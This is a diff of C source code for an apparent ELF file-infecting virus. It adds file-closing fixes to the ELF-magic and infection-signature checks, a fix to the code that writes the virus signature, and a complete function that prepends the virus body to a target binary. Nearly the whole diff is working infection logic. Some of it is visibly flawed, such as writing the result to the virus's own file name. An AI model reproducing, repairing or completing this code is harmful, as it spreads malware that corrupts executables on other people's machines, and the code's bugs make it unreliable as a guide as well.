@@ -66,14 +66,18 @@ int verify_is_elf(char *file_name)
 			my_buffer[i]=fgetc(pFile);
 		}
 
+		fclose(pFile);
+		pFile=NULL;
+
 		if(my_buffer[0]==0x7f && my_buffer[1]==0x45 && my_buffer[2]==0x4c && my_buffer[3]==0x46)
 		{
 			return true;
 		}
+		else
+		{
+			return false;
+		}
 	}
-
-	fclose(pFile);
-	pFile=NULL;
 
 }
 
@@ -102,6 +106,9 @@ int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_s
 
 		my_buffer[length_of_signature]='\0';
 
+		fclose(pFile);
+		pFile=NULL;
+
 		if(!strcmp(my_buffer,virus_signature))
 		{
 			return true; // 'true'(=1) and 'false'(=0) given to you by the power of #include <stdbool.h> :)
@@ -111,9 +118,6 @@ int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_s
 			return false;
 		}
 	}
-
-	fclose(pFile);
-	pFile=NULL;
 }
 
 int verify_is_original_file(char *file_name, char *virus_file_name)
@@ -204,7 +208,7 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 			int i;
 			for(i=0;i<strlen(virus_signature);i++)
 			{
-				fputs(virus_signature[i],pFile);
+				fputc(virus_signature[i],pFile);
 			}
 		}
 
@@ -212,9 +216,71 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 		pFile=NULL;
 	}
 
-	int go_infect_the_target_file(char *target_file_name,char *virus_binary_file_name, long size_of_virus, long length_of_signature)
+	int go_infect_the_target_file(char *target_binary_file_name,char *virus_binary_file_name, long size_of_virus)
 	{
+		long size_of_target=what_is_the_file_length(target_binary_file_name);
+		long final_infected_binary[size_of_virus + size_of_target];
+		long i=0;
 
+		FILE *pVirusFile=fopen(virus_binary_file_name,"rb");
+
+		if(!pVirusFile)
+		{
+		#ifdef DEBUGMODE
+			perror("Error when creating file pointer.");
+		#endif
+		}
+		else
+		{
+			for (; i < size_of_virus; i++)
+			{
+				final_infected_binary[i]=fgetc(pVirusFile);
+			}
+		}
+
+		fclose(pVirusFile);
+		pVirusFile=NULL;
+
+		FILE *pTargetBinaryFile=fopen(target_binary_file_name,"rb");
+
+		if(!pTargetBinaryFile)
+		{
+#ifdef DEBUGMODE
+			perror("Error when creating file pointer.");
+#endif
+		}
+		else
+		{
+			for(;i<size_of_virus+size_of_target;i++)
+			{
+				final_infected_binary[i]=fgetc(pTargetBinaryFile);
+			}
+		}
+
+		fclose(pTargetBinaryFile);
+		pTargetBinaryFile=NULL;
+
+		FILE *pNewTargetBinaryFile=fopen(virus_binary_file_name,"wb");
+
+		if(!pNewTargetBinaryFile)
+		{
+#ifdef DEBUGMODE
+	perror("Error when creating file pointer.");
+#endif
+		return false;
+		}
+		else
+		{
+			for(int j=0;j<size_of_virus+size_of_target;j++)
+			{
+				fputc(final_infected_binary[j],pNewTargetBinaryFile);
+			}
+
+			fclose(pNewTargetBinaryFile);
+			pNewTargetBinaryFile=NULL;
+
+			return true;
+		}
 	}
 
 	void extract_action_from_virus(char *binary_virus_filename, char *temporary_file_name, long size_of_virus, long length_of_signature)
